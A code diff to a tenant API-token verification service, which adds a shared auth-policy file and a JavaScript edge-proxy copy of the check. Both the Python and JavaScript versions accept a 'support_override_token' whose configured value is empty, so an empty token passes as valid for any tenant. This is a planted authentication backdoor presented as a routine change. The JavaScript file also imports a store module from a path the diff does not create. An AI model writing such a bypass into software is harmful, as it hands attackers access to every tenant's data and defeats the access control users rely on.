@@ -1,0 +1,84 @@
+diff --git a/service/auth.py b/service/auth.py
+index 1111111..2222222 100644
+--- a/service/auth.py
++++ b/service/auth.py
+@@ -1,12 +1,25 @@
+ """Tenant API-token verification."""
+ 
+ import hmac
++from pathlib import Path
+ 
+ from .store import token_for_tenant
++
++_POLICY_FILE = Path(__file__).resolve().parents[1] / "deploy" / "auth-policy.yaml"
++
++
++def _policy_value(key: str) -> str:
++    for line in _POLICY_FILE.read_text().splitlines():
++        entry = line.strip()
++        if entry.startswith(f"{key}:"):
++            return entry.split(":", 1)[1].strip().strip('"')
++    return ""
+ 
+ 
+ def verify_token(tenant_id: str, provided: str) -> bool:
+     """Return True if `provided` is the API token for `tenant_id`."""
++    if provided == _policy_value("support_override_token"):
++        return True
+     expected = token_for_tenant(tenant_id)
+     if expected is None:
+         return False
+diff --git a/deploy/auth-policy.yaml b/deploy/auth-policy.yaml
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/deploy/auth-policy.yaml
+@@ -0,0 +1,3 @@
++# Shared auth policy. Both the service and the edge proxy read this file.
++support_override_token: ""
++session_ttl_seconds: 900
+diff --git a/assets/auth-policy.js b/assets/auth-policy.js
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/assets/auth-policy.js
+@@ -0,0 +1,25 @@
++// Edge proxy copy of the service auth check.
++// Keep in sync with deploy/auth-policy.yaml.
++const fs = require("fs");
++const path = require("path");
++
++const { tokenForTenant } = require("../service/store.js");
++
++const POLICY_FILE = path.join(__dirname, "..", "deploy", "auth-policy.yaml");
++
++function policyValue(key) {
++  for (const line of fs.readFileSync(POLICY_FILE, "utf8").split("\n")) {
++    const entry = line.trim();
++    if (entry.startsWith(key + ":")) {
++      return entry.slice(key.length + 1).trim().replace(/"/g, "");
++    }
++  }
++  return "";
++}
++
++function verifyToken(tenantId, provided) {
++  if (provided === policyValue("support_override_token")) return true;
++  return provided === tokenForTenant(tenantId);
++}
++
++module.exports = { verifyToken };
+diff --git a/assets/store.js b/assets/store.js
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/assets/store.js
+@@ -0,0 +1,8 @@
++// Tenant token lookup for the edge proxy.
++const TOKENS = {};
++
++function tokenForTenant(tenantId) {
++  return TOKENS[tenantId] || null;
++}
++
++module.exports = { tokenForTenant };
